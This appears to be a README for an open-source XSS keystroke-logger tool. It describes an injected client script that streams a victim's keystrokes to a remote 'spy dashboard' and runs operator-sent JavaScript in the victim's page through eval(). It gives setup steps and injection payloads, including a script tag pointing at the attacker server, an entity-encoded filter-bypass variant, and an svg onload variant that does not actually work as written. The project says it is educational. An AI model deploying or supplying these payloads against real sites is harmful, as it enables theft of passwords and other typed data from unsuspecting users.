# xss-keylogger
A simple keystroke logger that listens and sends all keystrokes for a user on a Cross-site scripting (XSS) vulnerable 
page to a remote dashboard page via [websockets][1].

## Demo
![](https://cloud.githubusercontent.com/assets/315585/4782509/1aafaf46-5cf8-11e4-87c6-a698c7c47deb.gif)

## Introduction
The XSS Keylogger project comes with a Node server and a client side script. The client side script is typically
injected in a web page viewed by other users. The client side script connects using a persistent websocket
connection to the Node server that then relays information received from the client to a remote monitoring dashboard.

The remote monitoring dashboard is also able to send a JavaScript snippet that is run remotely on a XSS exploited
web page that is being visited by an unsuspected user by piping it through [`eval()`][2].

## Motivation
This project was created for XSS educational purposes and to raise awareness on how such a vulnerability can be
exploited.

**Important:** This solution should not be used for any malicious or illegal purposes.

## Setup
Install `npm`, the Node package manager, using the [Homebrew][3] package manager (or using any other means of getting
`npm` installed. Once installed, run `npm install` to resolve and install project related dependencies.

```
brew install npm
npm install
```

## Running
1. Run `node index.js` to start up the Node server. The server will run on port `:3000` by default.
2. Visit `http://localhost:3000/monitor.html` to view the spy dashboard that logs all remote keystrokes
3. Visit `http://localhost:3000/innocent.html` to view a sample web page that has been exploited with the XSS
   keystroke logger client script. Any text typed on the input fields of this page will immediately be made
   visible in the remote spy dashboard.
4. Type and send JavaScript snippet to run in the context of the remote client from the spy dashboard. Some tame
   example remote client snippets:

```
// Show a popup remotely
alert("You've been Sn00ped!");

// Change background of client page to pink
document.body.style.background = 'pink';
```

## Embedding Client Side script

```
// Embed and execute client side script by using a script tag if it is allowed in XSS vulnerable web page
<script src="http://localhost:3000/snoop.js"></script>

// Encode special tags to HTML code to bypass sites with simple inadequate encoding of special tags only
&#060;script src="http://localhost:3000/snoop.js"&#062;&#060;/script&#062;
```

Some sites will prevent any `<script>` tags to be embedded or posted in their input fields. In that case, you
could try to embed and run xss-keylogger client side script as part of the `onload` attribute of an `svg` element.
```
<svg onload="http://localhost:3000/snoop.js" />
```

## Features

### Keystroke Logging

### Running Remote JavaScript

[1]: http://dev.w3.org/html5/websockets
[2]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
[3]: http://brew.sh